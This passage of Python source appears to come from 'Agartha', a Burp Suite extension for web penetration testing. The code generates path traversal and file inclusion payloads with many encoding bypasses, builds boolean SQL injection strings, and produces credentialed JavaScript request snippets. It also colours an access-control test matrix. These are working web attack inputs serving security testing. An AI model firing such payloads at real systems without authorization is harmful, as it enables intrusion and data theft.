                listLFI.append(_resultTxt + filePath + "%0D.jpg\n")
                listLFI.append(_resultTxt + filePath + "%FF.jpg\n")

                # backslash
                # replace with /
                delimetersSlash = ["%2f", "%252f", "%255c", "%c0%af", "%25c0%25af", "%c1%9c", "%25c1%259c", "%%32%66", "%%35%63", "/", "/", "/", "%u2215", "%u2216", "%uEFC8", "%uF025", "0x2f", "%c0%2f", "//", "///", "\\/", "\\/", "%uEFC8", "%uF025", "/\\", "/\\", "//", "%%32%66", "/"]
                # replace with ..
                delimetersDots = ["%2e%2e", "%252e%252e", "%252e%252e", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%%32%65%%32%65", "%%32%65%%32%65", "\\..", "...", "....", "%uff0e%uff0e", "..", "..", "..", "0x2e0x2e", "%c0%2e%c0%2e", "..", "..", "..", "....", "..", "..", "..", "....", "....", "..", "%%32%65%%32%65"]
                for i in range(len(delimetersSlash)):
                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]) + filePath + "\n")
                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]) + "/" + filePath + "\n")
                    listLFI.append((_resultTxt + filePath).replace("/", delimetersSlash[i]) + "\n")
                    listLFI.append((_resultTxt).replace("..", delimetersDots[i]) + filePath + "\n")
                    listLFI.append((_resultTxt + filePath).replace("..", delimetersDots[i]) + "\n")
                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + filePath + "\n")
                    listLFI.append((_resultTxt + filePath).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "\n")
                # backslash

                # forward slash
                # # replace with \
                delimetersSlash = ["%5c", "%255c", "\\", "\\", "\\", "\\\\", "%u2216", "0x5c", "%c0%5c", "\\\\", "\\\\\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "%c1%9c", "\\"]
                # replace with ..
                delimetersDots = ["%2e%2e", "%252e%252e", "..", "...", "....", "....", "%uff0e%uff0e", "0x2e0x2e", "%c0%2e%c0%2e", "..", "..", "0x2e0x2e", "%uff0e%uff0e", "%c0%ae%c0%ae", "%c0%2e%c0%2e", "%2e%2e", "%25c0%25ae%25c0%25ae", "%252e%252e", "..", "%c0%ae%c0%ae"] 
                for i in range(len(delimetersSlash)):
                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]) + filePath + "\n")
                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]) + "/" + filePath + "\n")
                    listLFI.append((_resultTxt + filePath).replace("/", delimetersSlash[i]) + "\n")
                    listLFI.append((_resultTxt).replace("..", delimetersDots[i]) + filePath + "\n")
                    listLFI.append((_resultTxt + filePath).replace("..", delimetersDots[i]) + "\n")
                    listLFI.append((_resultTxt).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + filePath + "\n")
                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "/" + filePath + "\n")
                    listLFI.append((_resultTxt)[:-1].replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "/" + filePath + "\n")
                    listLFI.append((_resultTxt + filePath).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "\n")
                # forward slash

                if "\\" in self._txtDictParam.text: 
                    listLFI.append(_resultTxt + self._txtDictParam.text + "\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%00index.html\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%20index.html\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%09index.html\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%0Dindex.html\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%FFindex.html\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%00\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%20\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%09\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%0D\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%FF\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "/..;/\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + ";index.html\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%00.jpg\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%00.jpg\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%20.jpg\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%09.jpg\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%0D.jpg\n")
                    listLFI.append(_resultTxt + self._txtDictParam.text + "%FF.jpg\n")

            counter = counter + 1

        listLFI = list(set(listLFI))
        listLFI.sort(reverse=True)
        self._tabDictResultDisplay.setText(''.join(map(str, listLFI)))
        self._lblStatusLabel.setText('File dictionary: "' + self._txtDictParam.text + '", with '+ str(len(listLFI)) + ' result. Please make sure payload encoding is disabled, unless you are sure what you are doing.') 
        return

    def funcSQLi(self, ev):
        listSQLi = []
        delimeterStarts = ["", "'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
        delimeterBooleans = ["1=1", "1=2", "1<2", "1>2", "true", "false"]
        delimeterEnds = ["", " --", " #", ";", "; --", "; #"]

        for delimeterStart in delimeterStarts:
            for delimeterBoolean in delimeterBooleans:
                for delimeterEnd in delimeterEnds:
                    listSQLi.append(delimeterStart + " or " + delimeterBoolean + delimeterEnd + "\n")

        delimeterStarts = ["'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
        delimeterEnds = [" --", " #", "; --", "; #"]
        for delimeterStart in delimeterStarts:
            for delimeterEnd in delimeterEnds:
                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + "\n")
                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + "\n")
                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
                listSQLi.append(delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")
                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + "\n")
                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + "\n")
                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + delimeterStart + delimeterEnd + "\n")
                listSQLi.append(" or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "abc" + delimeterStart + delimeterEnd + "\n")

        delimeterStarts = ["", "'", "\'", "\\'", "\"", "\\\"", "\\\\\""]
        delimeterEnds = ["", " --", " #", ";", "; --", "; #"]
        for delimeterStart in delimeterStarts:
            for delimeterEnd in delimeterEnds:
                listSQLi.append(delimeterStart + delimeterEnd + "\n")
                listSQLi.append(delimeterStart + delimeterEnd + "\n")

        listSQLi = [elem for elem in listSQLi if elem.strip()]
        listSQLi = list(set(listSQLi))
        listSQLi.sort(reverse=True)

        self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
        self._lblStatusLabel.setText('Boolean based Sql Injection dictionary generation is returned with '+ str(len(listSQLi)) + ' records.') 
        return

    def getTabCaption(self):
        return "Agartha"
    def getUiComponent(self):
        return self._MainTabs
    def getHttpService(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getHttpService()
    def getRequest(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getRequest()
    def getResponse(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getResponse()    
    def createMenuItems(self, invocation):
        self.context = invocation
        menu_list = ArrayList()
        menu_list.add(JMenuItem("Agartha Panel", actionPerformed=self.agartha_menu))
        menu_list.add(JMenuItem("Copy as JavaScript", actionPerformed=self.js_menu))
        return menu_list
    def js_menu(self,event):
        # right click menu
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        http_contexts = self.context.getSelectedMessages()
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = str(self._helpers.analyzeRequest(http_contexts[0]).getUrl())
        method=_req.splitlines()[0].split(" ", 1)[0]

        fullHeader=""
        for line in _req.splitlines()[1:-1]:
            if line and not any(re.findall(r'cookie|token|auth', line, re.IGNORECASE)):
                fullHeader += "xhr.setRequestHeader('" + line.split(":", 1)[0] + "','" + line.split(":", 1)[1] + "');"

        if method == "GET":
            minHeader = "var xhr=new XMLHttpRequest();xhr.open('GET','" + _url + "');xhr.withCredentials=true;"
            jscript = "Http request with minimum header paramaters in JavaScript:\n\t<script>" + minHeader + "xhr.send();</script>\n\n"
            jscript += "Http request with all header paramaters in JavaScript:\n\t<script>" + minHeader + fullHeader + "xhr.send();</script>"

        else:
            contentType=""
            for line in _req.splitlines():
                if any(re.findall(r'Content-type', line, re.IGNORECASE)):
                    contentType = line.split(" ", 1)[1]
                    break
            if contentType:
                contentType="xhr.setRequestHeader('Content-type','" + contentType + "');"
                
            if _req.splitlines()[-1]:
                sendData="'" + _req.splitlines()[-1] + "'"
            
            minHeader = "var xhr=new XMLHttpRequest();xhr.open('" + method + "','" + _url + "');xhr.withCredentials=true;"
            jscript = "Http request with minimum header paramaters in JavaScript:\n\t<script>" + minHeader + contentType.strip() + "xhr.send(" + sendData + ");</script>\n\n"
            jscript += "Http request with all header paramaters in JavaScript:\n\t<script>" + minHeader + fullHeader + "xhr.send(" + sendData + ");</script>"
        
        jscript += "\n\nFor redirection, please also add this code before '</script>' tag:\n\txhr.onreadystatechange=function(){if (this.status===302){var location=this.getResponseHeader('Location');return ajax.call(this,location);}};"

        clipboard.setContents(StringSelection(jscript), None)

    def agartha_menu(self,event):
        # right click menu
        http_contexts = self.context.getSelectedMessages()
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = ""
        for http_context in http_contexts:
            _url += str(self._helpers.analyzeRequest(http_context).getUrl()) + "\n"
        self._tbAuthHeader.setText(_req)
        self._tbAuthURL.setText(_url)
        self._MainTabs.setSelectedComponent(self._tabAuthSplitpane)
        self._MainTabs.getParent().setSelectedComponent(self._MainTabs)
    def authMatrix(self, ev):
        t= Thread(target=self.authMatrixThread,args=[self])
        t.start()
        return
    def _updateReqResView(self, ev):
        try:
            row = self.tableMatrix.getSelectedRow()
            userID = self.tableMatrix.getSelectedColumn()
            if userID==0:
                self._requestViewer.setMessage("", False)
                self._responseViewer.setMessage("", False)
            else:
                self._requestViewer.setMessage(self.httpReqRes[userID-1][row].getRequest(), False)
                self._responseViewer.setMessage(self.httpReqRes[userID-1][row].getResponse(), False)
        except:
            self._requestViewer.setMessage("", False)
            self._responseViewer.setMessage("", False)
    
    def isURLValid(self, urlAdd):
        if " " in urlAdd.strip():
            return False
        elif urlAdd.startswith("http"):
            return True
        else:
            #white space exception
            if urlAdd:
                return False
            else:
                return True

class UserEnabledRenderer(TableCellRenderer):
    def __init__(self, defaultCellRender, userNamesHttpUrls):
        self._defaultCellRender = defaultCellRender
        self.urlList= userNamesHttpUrls
        self.colorsUser = [Color(204, 229, 255), Color(204, 255, 204), Color(204, 204, 255), Color(189,183,107)]        
        self.colorsAlert = [Color.white, Color(255, 153, 153), Color(255,218,185), Color(255, 255, 204), Color(211,211,211)]

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        cell = self._defaultCellRender.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column)
        toolTipMessage = ""
        cell.setBackground(self.colorsAlert[0])
        try:
            if column == 0:
                #URL section - default whitee
                cell.setBackground(self.colorsAlert[0])
                toolTipMessage = "Requested URLs!"
            elif table.getValueAt(row, column) and not table.getValueAt(row, column).startswith("HTTP 2") and not table.getValueAt(row, column).startswith("HTTP 3"):
                #error or http 4XX/5XX
                cell.setBackground(self.colorsAlert[4])
                toolTipMessage = "The request returns HTTP 4XX/5xx response!"
            elif column == 1:
                #no auth
                cell.setBackground(self.colorsAlert[0])
                if _colorful:
                    for y in range(2,table.getColumnCount()):                        
                        if table.getValueAt(row, y) == table.getValueAt(row, column):                        
                            if table.getValueAt(row, y).startswith("HTTP 2"):
                                cell.setBackground(self.colorsAlert[1])
                                toolTipMessage = "The URL returns HTTP 2XX without authentication!"
                            elif table.getValueAt(row, y).startswith("HTTP 3"):
                                if not cell.getBackground() == self.colorsAlert[1]:
                                    #cell.setBackground(self.colorsAlert[3])
                                    toolTipMessage = "The URL returns HTTP 3XX without authentication!"
                        elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                if not cell.getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[2])
                                    toolTipMessage = "The URL returns HTTP 2XX with different length and without authentication!"
            elif table.getValueAt(row, 0) in self.urlList[column- 1]:
                cell.setBackground(self.colorsUser[column-2])
                toolTipMessage = "Http response of the user's own URL!"
            else:    
                #other users
                cell.setBackground(self.colorsAlert[0])
                if _colorful:
                    for y in range(2,table.getColumnCount()):
                        if table.getValueAt(row, y) == table.getValueAt(row, column):
                        # responses are same: red or yellow
                            if table.getValueAt(row, y).startswith("HTTP 2"):
                                cell.setBackground(self.colorsAlert[1])
                                toolTipMessage = "The URL is not in the user's list but returns HTTP 2XX!"
                            elif table.getValueAt(row, y).startswith("HTTP 3"):
                                if not cell.getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[3])
                                    toolTipMessage = "The URL is not in the user's list and returns HTTP 3XX!"
                        elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                        # response lengths are different, but responses code might be the same
                            if not cell.getBackground() == self.colorsAlert[1]:    
                                cell.setBackground(self.colorsAlert[2])
                                toolTipMessage = "The URL is not in the user's list but returns HTTP 2XX with different length!"
        except:
            cell.setBackground(self.colorsAlert[0])

        if isSelected:
            cell.setBackground(Color(230,230,200))
            
        if hasFocus:
            cell.setBackground(Color(230,230,220))
            cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC));
            cell.setToolTipText(toolTipMessage)
        
        return cell

class CustomDefaultTableModel(DefaultTableModel):
    def __init__(self, data, headings) :
        DefaultTableModel.__init__(self, data, headings)

    def isCellEditable(self, row, col) :
        return col == 0
